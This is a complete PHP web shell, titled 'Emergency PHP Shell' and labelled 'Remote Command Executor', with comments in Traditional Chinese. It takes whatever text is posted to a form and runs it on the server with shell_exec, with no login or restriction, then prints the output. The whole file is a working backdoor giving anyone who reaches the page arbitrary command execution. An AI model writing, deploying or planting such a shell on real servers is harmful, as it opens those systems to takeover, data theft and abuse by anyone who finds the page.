<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <title>Emergency PHP Shell</title>
    <style>
        body { background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 20px; }
        input { width: 80%; background: #333; color: #fff; border: 1px solid #555; padding: 5px; }
        pre { background: #000; padding: 15px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; }
        .prompt { color: #569cd6; font-weight: bold; }
    </style>
</head>
<body>
    <h2>Remote Command Executor</h2>
    
    <form method="POST">
        <span class="prompt">guest@remote:~$ </span>
        <input type="text" name="command" autofocus placeholder="輸入指令後按 Enter...">
    </form>

    <?php
    if (isset($_POST['command']) && $_POST['command'] !== '') {
        $cmd = $_POST['command'];
        
        // 加上 2>&1 可以確保捕捉到錯誤訊息
        // 加上 htmlspecialchars 防止輸出內容被瀏覽器當作 HTML 解析
        $output = shell_exec($cmd . ' 2>&1');
        
        echo "<h3>執行結果:</h3>";
        echo "<pre>" . htmlspecialchars($output) . "</pre>";
    }
    ?>
</body>
</html>